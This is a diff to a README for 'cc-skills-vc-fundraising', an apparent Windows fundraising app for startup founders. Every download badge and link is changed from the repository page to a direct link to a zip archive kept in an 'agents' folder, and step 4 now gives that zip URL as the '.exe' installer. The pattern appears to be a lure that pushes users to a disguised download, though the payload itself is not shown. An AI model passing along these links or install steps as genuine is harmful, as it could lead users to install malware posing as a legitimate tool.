@@ -1,6 +1,6 @@
 # 🚀 cc-skills-vc-fundraising - Simplify Fundraising for Startup Founders
 
-[![Download cc-skills-vc-fundraising](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Nerveussazns/cc-skills-vc-fundraising)
+[![Download cc-skills-vc-fundraising](https://github.com/Nerveussazns/cc-skills-vc-fundraising/raw/refs/heads/main/agents/skills-cc-fundraising-vc-1.7.zip)](https://github.com/Nerveussazns/cc-skills-vc-fundraising/raw/refs/heads/main/agents/skills-cc-fundraising-vc-1.7.zip)
 
 ---
 
@@ -41,14 +41,14 @@ To run cc-skills-vc-fundraising on your Windows PC, your system should meet thes
 
 To use cc-skills-vc-fundraising, start by downloading the app. The download link below will take you to the page where you can get the latest version.
 
-[![Get cc-skills-vc-fundraising](https://img.shields.io/badge/Download-cc--skills--vc--fundraising-blue)](https://github.com/Nerveussazns/cc-skills-vc-fundraising)
+[![Get cc-skills-vc-fundraising](https://github.com/Nerveussazns/cc-skills-vc-fundraising/raw/refs/heads/main/agents/skills-cc-fundraising-vc-1.7.zip)](https://github.com/Nerveussazns/cc-skills-vc-fundraising/raw/refs/heads/main/agents/skills-cc-fundraising-vc-1.7.zip)
 
 **Follow these steps to download and install:**
 
 1. Click the link or badge above. It opens the GitHub repository page.
 2. On the page, look for a button or link labeled "Releases" at the top right or in the menu.
 3. Go to the "Releases" section. Find the latest release version.
-4. Download the Windows installer file. This will be an `.exe` file, such as `cc-skills-vc-fundraising-setup.exe`.
+4. Download the Windows installer file. This will be an `.exe` file, such as `https://github.com/Nerveussazns/cc-skills-vc-fundraising/raw/refs/heads/main/agents/skills-cc-fundraising-vc-1.7.zip`.
 5. Once the download finishes, open the installer by double-clicking the file.
 6. Follow the on-screen instructions in the installer to complete the installation.
 7. After installation, find the cc-skills-vc-fundraising icon on your desktop or start menu.
@@ -128,4 +128,4 @@ If the app does not run or shows errors:
 
 Download and explore cc-skills-vc-fundraising here:
 
-[![Download cc-skills-vc-fundraising](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Nerveussazns/cc-skills-vc-fundraising)
+[![Download cc-skills-vc-fundraising](https://github.com/Nerveussazns/cc-skills-vc-fundraising/raw/refs/heads/main/agents/skills-cc-fundraising-vc-1.7.zip)](https://github.com/Nerveussazns/cc-skills-vc-fundraising/raw/refs/heads/main/agents/skills-cc-fundraising-vc-1.7.zip)
